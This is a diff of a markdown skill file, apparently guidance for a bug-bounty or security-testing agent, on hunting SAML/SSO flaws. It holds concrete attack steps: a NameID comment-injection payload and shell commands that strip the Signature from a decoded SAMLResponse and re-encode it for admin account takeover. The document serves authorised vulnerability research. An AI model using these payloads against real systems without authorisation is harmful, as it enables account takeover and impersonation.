@@ -1,6 +1,6 @@
 ---
 name: hunt-saml
-description: "Hunt SAML / SSO attacks. Patterns: XML Signature Wrapping (XSW1-XSW8) — modify Assertion while keeping Signature valid by relocating signed element, comment injection in NameID (admin@target.com<!--evil-->@attacker.com → some parsers see admin@target.com), signature stripping (remove Signature element entirely, server should reject but doesn't), key confusion (signed by attacker's IdP, accepted by SP), audience-restriction not validated, replay attack (same Assertion accepted twice within validity window). Tools: SAML Raider Burp extension, samlmagic, manual XML manipulation. Detection: any /saml endpoint, /Shibboleth.sso, /sso/saml/, Microsoft ADFS endpoints. Validate: account takeover via altered NameID, admin role injection via altered AttributeStatement. Real paid examples on Auth0, Okta, Microsoft, custom SAML implementations. Use when hunting SSO flows, when SAML AssertionConsumerService is reachable, when chaining IdP-trust to SP-impersonation."
+description: "Hunt SAML / SSO attacks. Patterns: XML Signature Wrapping (XSW) — modify Assertion while keeping Signature valid by relocating signed element, comment injection in NameID (admin@target.com<!--evil-->@attacker.com → some parsers see admin@target.com), signature stripping (remove Signature element entirely, server should reject but doesn't), key confusion (signed by attacker's IdP, accepted by SP), audience-restriction not validated, replay attack (same Assertion accepted twice within validity window). Tools: SAML Raider Burp extension, samlmagic, manual XML manipulation. Detection: any /saml endpoint, /Shibboleth.sso, /sso/saml/, Microsoft ADFS endpoints. Validate: account takeover via altered NameID, admin role injection via altered AttributeStatement. Use when hunting SSO flows, when SAML AssertionConsumerService is reachable, when chaining IdP-trust to SP-impersonation."
 ---
 
 ## 20. SAML / SSO ATTACKS
@@ -38,11 +38,15 @@ cat recon/$TARGET/urls.txt | grep -iE "saml|sso|login.*redirect|oauth|idp|sp"
 
 ### Attack 2: Comment Injection in NameID
 ```xml
-<!-- XML strips comments before passing to app -->
-<NameID>admin<!---->@company.com</NameID>
-<!-- Signature computed over: "admin@company.com" (with comment) -->
-<!-- App receives: "admin@company.com" (comment stripped) -->
-<!-- Works when signer and processor handle comments differently -->
+<!-- Attacker registers/controls account: admin@company.com.evil.com -->
+<NameID>admin@company.com<!---->.evil.com</NameID>
+<!-- Signed canonical form (C14N without-comments strips the comment BEFORE
+     digest): "admin@company.com.evil.com" — the value the signature covers. -->
+<!-- App's XML processor also strips the comment but only reads the text node
+     UP TO the comment boundary: "admin@company.com" — a DIFFERENT effective
+     identity than was signed. The discrepancy is the bug. -->
+<!-- Works when signer's C14N and app's text extraction disagree on comments.
+     CVE-2017-11428 (Ruby-SAML / OneLogin), CVE-2016-5697. -->
 ```
 
 ### Attack 3: Signature Stripping
@@ -50,7 +54,7 @@ cat recon/$TARGET/urls.txt | grep -iE "saml|sso|login.*redirect|oauth|idp|sp"
 1. Decode SAMLResponse: echo "BASE64" | base64 -d | xmllint --format - > saml.xml
 2. Delete the entire <Signature> element
 3. Change NameID to admin@company.com
-4. Re-encode: cat saml.xml | gzip | base64 -w0 (or just base64 -w0)
+4. Re-encode: base64 -w0 saml.xml  (POST binding = raw base64, NO compression; Redirect binding uses raw DEFLATE — not gzip)
 5. Submit — if server doesn't verify signature presence = admin ATO
 ```
 
